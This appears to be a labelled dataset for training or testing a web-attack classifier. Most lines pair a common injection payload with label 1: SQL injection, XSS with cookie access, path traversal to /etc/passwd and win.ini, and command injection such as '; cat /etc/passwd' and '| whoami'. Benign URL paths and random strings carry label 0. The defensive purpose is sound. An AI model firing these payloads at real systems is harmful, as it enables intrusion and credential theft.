%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
T2lD9oGy3Mw,0
' OR 8=5 --,1
/register?id=4446,0
' OR '1'='1,1
/settings?session=42105,0
/settings?id=5414,0
../../../../etc/passwd,1
/blog?id=7446,0
../../../windows/win.ini,1
/blog?id=4292,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=396;alert(a)</script>,1
index,0
RO6CopdN,0
<script>var a=593;alert(a)</script>,1
' OR 1=8 --,1
/blog?id=4061,0
' OR 7=6 --,1
| whoami,1
/contact?id=1463,0
<script>var a=417;alert(a)</script>,1
admin' --,1
lqK4IYrTX,0
; cat /etc/passwd,1
J00WqHXvDUuQouK,0
<script>alert(document.cookie)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/register?id=6517,0
nv91AlQochN,0
ASPATj5iH,0
/settings?session=44030,0
contact,0
cart,0
/home?session=41840,0
../../../../etc/passwd,1
Nv5wlQFYd,0
javascript:alert(1),1
' OR 7=6 --,1
<script>var a=185;alert(a)</script>,1
register,0
/cart?session=61231,0
/login?session=97994,0
<script>var a=146;alert(a)</script>,1
3Js90sRg,0
<script>var a=159;alert(a)</script>,1
' OR 6=4 --,1
/register?id=6918,0
' OR '1'='1,1
/register?session=82301,0
' OR 6=7 --,1
login,0
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
4gsk2wQTuF,0
login,0
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
/contact?session=83466,0
../../../windows/win.ini,1
/dashboard?session=83624,0
/blog?session=53316,0
/blog?session=49720,0
' OR 1=1 --,1
zGHwh1Gr0,0
../../../windows/win.ini,1
../../../../etc/passwd,1
/login?id=8704,0
' OR 4=1 --,1
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/user?session=86126,0
<script>var a=272;alert(a)</script>,1
/settings?id=6809,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
<script>var a=483;alert(a)</script>,1
/dashboard?id=4647,0
| whoami,1
<script>alert(document.cookie)</script>,1
s E l E c T * f R o M a d m i n,1
/profile?session=31950,0
1' o r '1'='1,1
about,0
checkout,0
/search?id=1052,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
<script>var a=587;alert(a)</script>,1
| whoami,1
xam4ABpT5w32,0
admin' --,1
/settings?session=64972,0
/index?id=9698,0
1' o r '1'='1,1
JCckjXyNbmmMNou,0
/index?id=9835,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=3 --,1
/user?session=70227,0
Rfep4Y8S5Tm3,0
<script>var a=920;alert(a)</script>,1
/cart?id=6218,0
/blog?session=57614,0
/user?session=59751,0
about,0
| whoami,1
1' o r '1'='1,1
| whoami,1
/register?session=75515,0
/login?session=31198,0
/index?session=98417,0
../../../../etc/passwd,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=8897,0
admin'/* bypass */OR 1=1,1
user,0
' OR 5=4 --,1
/about?id=614,0
/profile?id=5845,0
<script>alert(document.cookie)</script>,1
/search?id=5292,0
p11ty3NavkuSh,0
/register?session=15612,0
/dashboard?session=62637,0
/home?session=26494,0
Tjb1zmwtDEwrEyV,0
/dashboard?id=4602,0
| whoami,1
<script>var a=607;alert(a)</script>,1
<script>var a=748;alert(a)</script>,1
blog,0
/about?id=4963,0
admin'/* bypass */OR 1=1,1
/about?id=2420,0
yOiXlxum7mAY6,0
1XnNuvEL66X,0
<script>var a=466;alert(a)</script>,1
index,0
SFuhCeqp9100rT,0
' OR '1'='1,1
' OR 3=8 --,1
/cart?session=99087,0
/home?id=2041,0
| whoami,1
' OR 2=7 --,1
/contact?id=5115,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
s E l E c T * f R o M a d m i n,1
admin'/* bypass */OR 1=1,1
yDP803hCxMF3,0
../../../windows/win.ini,1
dashboard,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
admin%00' OR 1=1,1
bWWyeWkh7zc5SyR,0
<script>var a=317;alert(a)</script>,1
cart,0
' OR 7=9 --,1
/contact?session=15150,0
<script>var a=65;alert(a)</script>,1
/profile?id=9609,0
contact,0
/about?id=7403,0
profile,0
/blog?session=39111,0
/blog?session=91078,0
' OR 1=1 --,1
javascript:alert(1),1
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 8=9 --,1
4HS0GIFzPRT3aCQ,0
../../../../etc/passwd,1
w5kTM6C7tpiyxI,0
Rpq5hF62,0
' OR 1=1 --,1
admin%00' OR 1=1,1
1' o r '1'='1,1
<script>alert(document.cookie)</script>,1
checkout,0
QBa3NRPVH,0
home,0
' OR 1=1 --,1
/profile?id=7524,0
/user?id=6558,0
javascript:alert(1),1
' OR 7=7 --,1
onerror=alert(1),1
/profile?session=85892,0
javascript:alert(1),1
profile,0
bPtmHcY347sPj,0
/register?id=8831,0
/about?session=97968,0
/profile?id=568,0
/contact?session=85437,0
<script>var a=686;alert(a)</script>,1
/login?id=1010,0
/search?id=6924,0
<script>var a=734;alert(a)</script>,1
admin%00' OR 1=1,1
<script>var a=197;alert(a)</script>,1
' OR 6=9 --,1
../../../windows/win.ini,1
/blog?id=2530,0
' OR 8=8 --,1
' OR 6=7 --,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/profile?session=93025,0
checkout,0
/about?session=14219,0
/index?id=1697,0
Fidx2A53,0
' OR 1=1 --,1
about,0
/blog?session=16264,0
/dashboard?id=7474,0
<script>var a=750;alert(a)</script>,1
QplqgIqosu9,0
eYrOyd5lLyZDZ6S,0
; cat /etc/passwd,1
/search?id=3963,0
42rU8fqu,0
<script>var a=938;alert(a)</script>,1
| whoami,1
' OR 1=2 --,1
../../../windows/win.ini,1
<script>var a=875;alert(a)</script>,1
7b9wWq0a,0
<script>var a=408;alert(a)</script>,1
' OR '1'='1,1
/index?id=8256,0
/settings?id=891,0
UgFoYYNvsB,0
register,0
' OR 7=8 --,1
/blog?id=283,0
/contact?session=23135,0
admin'/* bypass */OR 1=1,1
bruv8a3ykMyddV,0
; cat /etc/passwd,1
' OR 4=1 --,1
/profile?session=17495,0
checkout,0
contact,0
' OR 6=7 --,1
/home?id=7418,0
settings,0
/search?id=7905,0
onerror=alert(1),1
' OR 1=8 --,1
r4pr8YkL,0
javascript:alert(1),1
z0vg8TeA,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
1' o r '1'='1,1
<script>var a=836;alert(a)</script>,1
user,0
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
onerror=alert(1),1
4hH3e6B6GsiT,0
/register?id=1313,0
../../../windows/win.ini,1
checkout,0
<script>alert(document.cookie)</script>,1
<script>var a=447;alert(a)</script>,1
; cat /etc/passwd,1
user,0
hmfJCuaxgzgRrB,0
admin'/* bypass */OR 1=1,1
login,0
' OR 8=8 --,1
/blog?session=32493,0
YIB9kUKU,0
jy6cF6370mX,0
/search?id=6422,0
javascript:alert(1),1
<script>var a=635;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/login?session=65896,0
<script>var a=857;alert(a)</script>,1
javascript:alert(1),1
login,0
s E l E c T * f R o M a d m i n,1
50QKBNoMX,0
<script>var a=941;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
GwHxlLAz,0
checkout,0
28daudEz,0
/register?session=63601,0
<script>var a=590;alert(a)</script>,1
onerror=alert(1),1
/home?session=22299,0
JlH0Lzv9O,0
' OR 7=5 --,1
index,0
about,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=5051,0
/contact?id=9399,0
profile,0
/about?id=8990,0
onerror=alert(1),1
; cat /etc/passwd,1
' OR 9=4 --,1
admin'/* bypass */OR 1=1,1
unBF8tIBKOWyJ,0
../../../../etc/passwd,1
vPAu4qRc,0
| whoami,1
admin' --,1
/about?session=46541,0
/register?id=8239,0
<script>var a=822;alert(a)</script>,1
' OR '1'='1,1
/user?id=1783,0
bQHqwIef,0
about,0
javascript:alert(1),1
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
/checkout?session=90195,0
/home?id=6214,0
<script>var a=511;alert(a)</script>,1
n2YNO1Gs,0
k7ZTQjctg,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
<script>var a=323;alert(a)</script>,1
/settings?session=42699,0
/cart?session=89146,0
cart,0
<script>var a=454;alert(a)</script>,1
/contact?session=12828,0
Lub2XlbtOMSd,0
/register?id=533,0
/checkout?session=12687,0
admin'/* bypass */OR 1=1,1
/search?session=33003,0
../../../../etc/passwd,1
/checkout?session=22373,0
../../../windows/win.ini,1
/contact?id=5868,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/cart?session=76348,0
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=7811,0
cart,0
<script>alert(document.cookie)</script>,1
dashboard,0
/dashboard?id=5098,0
/checkout?id=4289,0
' OR 8=2 --,1
/contact?id=2060,0
OY29R7dWledi8,0
login,0
<script>var a=120;alert(a)</script>,1
/register?id=4521,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
register,0
' OR 9=2 --,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
' OR 1=7 --,1
miFwXiwPJ4om,0
login,0
/index?session=46845,0
s E l E c T * f R o M a d m i n,1
' OR 6=9 --,1
admin' --,1
<script>alert(document.cookie)</script>,1
' OR 1=9 --,1
; cat /etc/passwd,1
| whoami,1
blog,0
/home?session=28361,0
rmjbi47YY1r,0
profile,0
admin%00' OR 1=1,1
onerror=alert(1),1
qpJiFs4y2UiIKi,0
<script>var a=897;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
Fjx9WV41pHREo0T,0
register,0
/dashboard?session=22287,0
KOJyqo3vdKPTJA9,0
' OR 5=6 --,1
/about?id=2673,0
/search?session=87858,0
a9aleh6kwIJpG5,0
../../../windows/win.ini,1
' OR 1=1 --,1
/settings?id=4699,0
; cat /etc/passwd,1
/search?id=427,0
/contact?id=3125,0
javascript:alert(1),1
/blog?session=36982,0
<script>var a=695;alert(a)</script>,1
' OR 3=8 --,1
../../../windows/win.ini,1
admin'/* bypass */OR 1=1,1
about,0
/search?id=673,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
qnJVwJYy,0
/index?session=50688,0
ciW9v1gaeFa,0
admin%00' OR 1=1,1
cart,0
6AoyKCl28oyh2Bd,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 1=1 --,1
/cart?session=27968,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?id=8086,0
CYGi52nM610,0
../../../../etc/passwd,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?session=25317,0
/search?session=92632,0
checkout,0
bsj0f09Hvu,0
/checkout?session=83374,0
profile,0
1' o r '1'='1,1
../../../../etc/passwd,1
/profile?id=5838,0
register,0
settings,0
fUCf3L5CJphhpW,0
/home?id=6617,0
/checkout?id=672,0
/cart?id=4333,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=301;alert(a)</script>,1
/contact?session=16819,0
<script>var a=596;alert(a)</script>,1
k89qbDPlq6VVTJ0,0
' OR 7=8 --,1
/checkout?session=39179,0
/contact?session=77744,0
/contact?session=78213,0
/search?id=9669,0
; cat /etc/passwd,1
/settings?id=3558,0
admin' --,1
<script>var a=55;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
/home?session=23259,0
/user?id=6619,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
' OR 1=1 --,1
index,0
../../../../etc/passwd,1
onerror=alert(1),1
OrPozDrMTCxm5,0
admin'/* bypass */OR 1=1,1
dashboard,0
/login?session=91166,0
Aacop3iJFiUmK,0
3eCyjEfQiD,0
; cat /etc/passwd,1
dashboard,0
<script>var a=795;alert(a)</script>,1
5yyrAxCXBdl,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/register?session=96285,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../../etc/passwd,1
xdCSFWq6N1nR,0
/about?session=14735,0
/about?session=22946,0
user,0
s E l E c T * f R o M a d m i n,1
<script>var a=12;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
EGmEn265oxF3BAw,0
index,0
javascript:alert(1),1
4rhkXTzvlpm,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=7713,0
profile,0
/home?session=39141,0
admin%00' OR 1=1,1
<script>var a=25;alert(a)</script>,1
<script>var a=878;alert(a)</script>,1
' OR 6=4 --,1
blog,0
blog,0
/contact?session=41443,0
| whoami,1
/profile?session=71800,0
FnbpfboOrF3Ld,0
../../../windows/win.ini,1
<script>var a=850;alert(a)</script>,1
/profile?id=8436,0
gFOHty8l,0
/register?session=21081,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
/about?session=37709,0
<script>alert(document.cookie)</script>,1
' OR 5=6 --,1
GX2JWYEVpOX6zFv,0
admin' --,1
/home?id=3983,0
<script>var a=119;alert(a)</script>,1
UMVPcGLxaQw,0
settings,0
tW6a5B7DBthld8,0
../../../../etc/passwd,1
1' o r '1'='1,1
/home?id=4476,0
admin' --,1
/dashboard?session=11858,0
/search?id=7247,0
' OR 8=2 --,1
/search?session=47489,0
about,0
../../../../etc/passwd,1
/contact?session=48254,0
../../../../etc/passwd,1
/checkout?session=49280,0
cb78pCSlfUc7g9I,0
../../../../etc/passwd,1
DgxdAUYl,0
/search?id=3332,0
dashboard,0
/cart?session=62089,0
blog,0
' OR 6=4 --,1
tNdSiX07sYN,0
' OR 7=1 --,1
' OR 5=7 --,1
q4tgqqg2lCXBsyX,0
contact,0
admin%00' OR 1=1,1
/contact?session=45178,0
' OR 5=2 --,1
Wk4XSWOKBQN,0
<script>var a=933;alert(a)</script>,1
' OR 6=2 --,1
rXm7BuEB,0
/blog?session=51723,0
/settings?session=19691,0
1' o r '1'='1,1
index,0
/home?session=45078,0
/profile?id=4106,0
dNTbc9Wrxp28,0
/blog?session=59913,0
register,0
contact,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
Rt6zHVjuzWtE1h,0
' OR 8=4 --,1
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
1' o r '1'='1,1
/login?id=7665,0
onerror=alert(1),1
Lxa1rEAvhR2hmZ8,0
<script>var a=999;alert(a)</script>,1
home,0
cart,0
onerror=alert(1),1
s E l E c T * f R o M a d m i n,1
/checkout?session=54337,0
' OR '1'='1,1
N8zeTIaer,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
/user?session=69186,0
index,0
1' o r '1'='1,1
iM4c8GzPI6xty,0
javascript:alert(1),1
profile,0
search,0
<script>alert(document.cookie)</script>,1
/cart?id=3735,0
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=842;alert(a)</script>,1
/index?session=44946,0
<script>var a=706;alert(a)</script>,1
/home?id=9944,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
MSQTXfUSt,0
| whoami,1
blog,0
/contact?id=1439,0
/login?session=81079,0
<script>var a=701;alert(a)</script>,1
; cat /etc/passwd,1
<script>var a=210;alert(a)</script>,1
../../../windows/win.ini,1
PJ99FnNaEiuLqM,0
/blog?session=64308,0
contact,0
' OR 4=2 --,1
checkout,0
<script>var a=731;alert(a)</script>,1
IZtadqL6tOP,0
/login?id=7446,0
admin%00' OR 1=1,1
user,0
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/checkout?id=1341,0
search,0
| whoami,1
082u266j6nZ5iQ,0
' OR 1=8 --,1
/about?id=8898,0
/dashboard?session=26812,0
<script>var a=758;alert(a)</script>,1
/index?session=17303,0
| whoami,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/login?session=94512,0
' OR 5=8 --,1
/index?id=2787,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?id=4559,0
' OR 7=6 --,1
/user?id=6354,0
' OR 6=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Ccz3bQoF,0
s E l E c T * f R o M a d m i n,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
; cat /etc/passwd,1
<script>var a=961;alert(a)</script>,1
/home?id=7996,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/dashboard?session=64682,0
settings,0
register,0
/index?id=4842,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
blog,0
' OR 8=8 --,1
about,0
/dashboard?id=8179,0
<script>var a=253;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
dashboard,0
/index?id=5899,0
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
admin%00' OR 1=1,1
register,0
' OR '1'='1,1
/index?id=6700,0
' OR 1=1 --,1
' OR 1=1 --,1
1' o r '1'='1,1
checkout,0
login,0
javascript:alert(1),1
/index?id=4173,0
profile,0
onerror=alert(1),1
/search?id=1687,0
admin'/* bypass */OR 1=1,1
<script>var a=758;alert(a)</script>,1
' OR 2=1 --,1
/home?session=94037,0
' OR '1'='1,1
' OR 1=8 --,1
' OR 6=2 --,1
s E l E c T * f R o M a d m i n,1
' OR 5=1 --,1
/profile?id=6005,0
/home?id=7451,0
<script>var a=881;alert(a)</script>,1
<script>var a=442;alert(a)</script>,1
index,0
' OR 2=5 --,1
| whoami,1
' OR 6=1 --,1
/contact?session=71913,0
<script>var a=806;alert(a)</script>,1
search,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
6YtolwSbY4miZ,0
| whoami,1
bWnaleIXPE,0
ogqeRuFWcd4pW0F,0
login,0
admin'/* bypass */OR 1=1,1
; cat /etc/passwd,1
' OR 2=7 --,1
/home?id=9403,0
/dashboard?session=68552,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
register,0
admin%00' OR 1=1,1
user,0
4b09f7gyuyi7EWI,0
onerror=alert(1),1
/login?session=71615,0
' OR 1=1 --,1
/dashboard?id=9311,0
/contact?id=6116,0
/user?session=26971,0
/index?id=7116,0
profile,0
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
on68Ii0q,0
/about?session=45720,0
admin'/* bypass */OR 1=1,1
register,0
' OR 1=2 --,1
/user?session=26218,0
<script>var a=880;alert(a)</script>,1
/settings?id=8874,0
B2TkZiKW7x,0
/dashboard?session=60925,0
/settings?id=3059,0
admin%00' OR 1=1,1
EXTWZ4q50NODf,0
' OR 9=1 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
contact,0
; cat /etc/passwd,1
dashboard,0
/login?id=1593,0
javascript:alert(1),1
| whoami,1
settings,0
/about?session=89436,0
javascript:alert(1),1
| whoami,1
' OR 4=3 --,1
' OR 9=6 --,1
admin%00' OR 1=1,1
04rY5MjuBM,0
s E l E c T * f R o M a d m i n,1
/about?id=4293,0
home,0
psL8D8elkqvPJY,0
IyMKc0nb6xT,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 9=7 --,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
' OR 1=1 --,1
/register?id=2316,0
' OR 5=7 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=805;alert(a)</script>,1
; cat /etc/passwd,1
uH9AtL96VC2,0
/contact?session=53979,0
onerror=alert(1),1
' OR 1=9 --,1
CD0nUMVowXg4,0
<script>var a=229;alert(a)</script>,1
qxQB7Psh9GdPJ3J,0
/contact?session=13935,0
/login?id=6834,0
/settings?id=3677,0
/settings?id=3753,0
/cart?session=39678,0
| whoami,1
admin'/* bypass */OR 1=1,1
AbcZl9FBEgH,0
<script>var a=495;alert(a)</script>,1
<script>var a=910;alert(a)</script>,1
TNtsWA5xgwx6go,0
login,0
KlhXUuXAJdjX,0
/login?session=93263,0
/cart?id=7926,0
1' o r '1'='1,1
admin%00' OR 1=1,1
/home?session=10724,0
home,0
1' o r '1'='1,1
/search?id=2101,0
<script>var a=231;alert(a)</script>,1
/checkout?session=49233,0
javascript:alert(1),1
about,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/home?id=2879,0
/profile?session=18302,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
Ud8RTM1l,0
' OR 8=4 --,1
' OR 1=1 --,1
/search?session=80135,0
<script>var a=34;alert(a)</script>,1
/home?id=2259,0
; cat /etc/passwd,1
<script>alert(document.cookie)</script>,1
/home?id=6528,0
KpGv1CVYYeoFZP,0
/blog?id=8427,0
admin' --,1
/about?id=2540,0
<script>alert(document.cookie)</script>,1
' OR 5=5 --,1
/checkout?session=48785,0
/user?session=27049,0
/home?id=2967,0
admin%00' OR 1=1,1
home,0
<script>var a=927;alert(a)</script>,1
| whoami,1
admin'/* bypass */OR 1=1,1
oVaD2k8wSsCS,0
; cat /etc/passwd,1
' OR 2=5 --,1
' OR 5=8 --,1
ybrv48VxzkzNeZu,0
' OR '1'='1,1
' OR 6=2 --,1
/blog?id=9555,0
iNCCSppQ5,0
/user?id=5996,0
<script>alert(document.cookie)</script>,1
/about?id=115,0
login,0
<script>var a=55;alert(a)</script>,1
admin%00' OR 1=1,1
/login?id=5807,0
admin'/* bypass */OR 1=1,1
javascript:alert(1),1
gPmvDfc8n,0
<script>var a=650;alert(a)</script>,1
<script>alert(document.cookie)</script>,1
/login?id=7818,0
/contact?id=4875,0
/checkout?id=1665,0
2sRLqvorXeDyd,0
YcTZu2JoK,0
| whoami,1
| whoami,1
s E l E c T * f R o M a d m i n,1
home,0
/dashboard?id=3178,0
' OR 5=3 --,1
/cart?id=6833,0
/checkout?id=9345,0
onerror=alert(1),1
<script>var a=886;alert(a)</script>,1
XBH6VWapxiaV58,0
qzbTqeAQ,0
/blog?id=6888,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/index?session=65331,0
<script>var a=511;alert(a)</script>,1
<script>var a=75;alert(a)</script>,1
/register?id=1429,0
search,0
' OR 5=5 --,1
cart,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
/cart?id=2901,0
/profile?id=9279,0
<script>var a=927;alert(a)</script>,1
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/home?id=3626,0
' OR 4=5 --,1
/contact?id=501,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
admin' --,1
1' o r '1'='1,1
../../../windows/win.ini,1
<script>var a=523;alert(a)</script>,1
zEfEQS2Q,0
<script>var a=337;alert(a)</script>,1
admin' --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/about?session=70166,0
U2KRDExEc8NblaT,0
/profile?session=43551,0
/cart?id=144,0
profile,0
' OR 6=4 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
register,0
/login?id=9988,0
' OR '1'='1,1
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
register,0
' OR 8=6 --,1
cart,0
javascript:alert(1),1
' OR '1'='1,1
checkout,0
<script>var a=998;alert(a)</script>,1
alp5roOJ9U,0
/settings?id=8395,0
<script>alert(document.cookie)</script>,1
javascript:alert(1),1
/settings?session=11221,0
/contact?session=85511,0
<script>var a=636;alert(a)</script>,1
<script>var a=950;alert(a)</script>,1
' OR 4=9 --,1
<script>var a=295;alert(a)</script>,1
' OR 4=1 --,1
/home?id=808,0
; cat /etc/passwd,1
<script>var a=256;alert(a)</script>,1
/about?session=30344,0
admin%00' OR 1=1,1
/profile?session=69172,0
/about?session=22211,0
javascript:alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/index?session=43675,0
/contact?session=57948,0
' OR 6=5 --,1
' OR 2=9 --,1
contact,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
/profile?session=19737,0
' OR 7=2 --,1
4MC6QAcV0ibl70,0
user,0
profile,0
<script>alert(document.cookie)</script>,1
onerror=alert(1),1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
H2Mdpm9j287jxX,0
/search?id=7648,0
javascript:alert(1),1
/about?session=39575,0
<script>var a=262;alert(a)</script>,1
' OR 9=5 --,1
/settings?id=9438,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
Ylr6xwbm,0
admin%00' OR 1=1,1
7t6rwG7eUY,0
' OR 2=4 --,1
tV2O0pvbmbv,0
/register?id=7959,0
contact,0
profile,0
admin' --,1
blog,0
/dashboard?id=4555,0
Ipw9E3bdxVqE8jz,0
admin'/* bypass */OR 1=1,1
../../../windows/win.ini,1
' OR 1=1 --,1
javascript:alert(1),1
/login?session=85235,0
../../../../etc/passwd,1
/checkout?id=7570,0
0fwMSIgqw5Xcp,0
' OR '1'='1,1
../../../../etc/passwd,1
/search?id=6895,0
/checkout?id=8238,0
about,0
/search?session=95805,0
DOofougDbSBNxdY,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
; cat /etc/passwd,1
settings,0
pD1mVNcf,0
/cart?session=57521,0
../../../windows/win.ini,1
login,0
<script>var a=905;alert(a)</script>,1
| whoami,1
javascript:alert(1),1
user,0
admin' --,1
/settings?id=5789,0
/blog?id=7921,0
0rYgwkPvTNI,0
; cat /etc/passwd,1
/settings?session=12980,0
<script>var a=216;alert(a)</script>,1
checkout,0
/settings?session=98692,0
/dashboard?session=51671,0
/register?id=7755,0
admin' --,1
/index?id=5200,0
javascript:alert(1),1
' OR 1=1 --,1
/search?id=2847,0
HMJP0XWvkxHf,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
home,0
<script>var a=267;alert(a)</script>,1
../../../windows/win.ini,1
../../../windows/win.ini,1
/user?session=33813,0
' OR 4=6 --,1
; cat /etc/passwd,1
/contact?id=6739,0
/cart?id=5688,0
onerror=alert(1),1
<script>alert(document.cookie)</script>,1
admin'/* bypass */OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR '1'='1,1
/dashboard?id=3273,0
/settings?session=94186,0
profile,0
../../../windows/win.ini,1
/login?session=46749,0
' OR '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
QojrV3wtrU,0
/login?session=65414,0
<script>alert(document.cookie)</script>,1
../../../windows/win.ini,1
admin' --,1
/checkout?id=5764,0
/profile?id=8735,0
' OR 9=1 --,1
<script>var a=805;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
home,0
search,0
| whoami,1
' OR 2=1 --,1
admin' --,1
/blog?session=27836,0
s E l E c T * f R o M a d m i n,1
<script>var a=765;alert(a)</script>,1
NDDuFGMasdPKmnK,0
; cat /etc/passwd,1
/search?id=5910,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
admin'/* bypass */OR 1=1,1
onerror=alert(1),1
/register?id=6086,0
/login?id=5405,0
settings,0
<script>var a=93;alert(a)</script>,1
LPQno5nBJebaNNE,0
admin%00' OR 1=1,1
../../../../etc/passwd,1
<script>var a=14;alert(a)</script>,1
onerror=alert(1),1
' OR 9=7 --,1
/about?id=7046,0
home,0
admin%00' OR 1=1,1
<script>alert(document.cookie)</script>,1
home,0
<script>var a=107;alert(a)</script>,1
l4TFCe3jZ4q,0
javascript:alert(1),1
/cart?session=51377,0
cart,0
admin' --,1
<script>var a=285;alert(a)</script>,1
/search?session=40206,0
sTM6grlBY,0
settings,0
/about?id=8877,0
6elbcfWovRu,0
javascript:alert(1),1
cart,0
vbYAyZzHV,0
/search?id=3470,0
checkout,0
' OR 7=9 --,1
/settings?session=12642,0
../../../../etc/passwd,1
/blog?session=89352,0
1' o r '1'='1,1
/settings?id=8983,0
' OR 1=1 --,1
settings,0
/dashboard?session=89812,0
uLkorrwCvLIBO,0
contact,0
' OR '1'='1,1
<script>var a=610;alert(a)</script>,1
ZtJmSjPgl,0
admin' --,1
javascript:alert(1),1
' OR '1'='1,1
javascript:alert(1),1
<script>var a=911;alert(a)</script>,1
admin%00' OR 1=1,1
1' o r '1'='1,1
' OR 1=9 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
<script>var a=811;alert(a)</script>,1
javascript:alert(1),1
/blog?id=5340,0
admin'/* bypass */OR 1=1,1
GnADslU9jcGaL,0
register,0
/contact?session=36052,0
; cat /etc/passwd,1
<script>var a=366;alert(a)</script>,1
1' o r '1'='1,1
JxMvwQA7YRt4aX2,0
oqHa3Hvw2oZ,0
/settings?id=1637,0
xaOMZIM43JD,0
/cart?id=6986,0
admin'/* bypass */OR 1=1,1
s E l E c T * f R o M a d m i n,1
admin' --,1
/about?session=28019,0
' OR 8=4 --,1
/contact?session=25988,0
/register?id=4314,0
settings,0
/login?session=41804,0
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
On9VwaOiGK,0
' OR 9=2 --,1
/cart?id=5781,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
KwpEaLwGEflvq,0
' OR '1'='1,1
admin%00' OR 1=1,1
' OR 3=2 --,1
' OR 7=3 --,1
/contact?id=7788,0
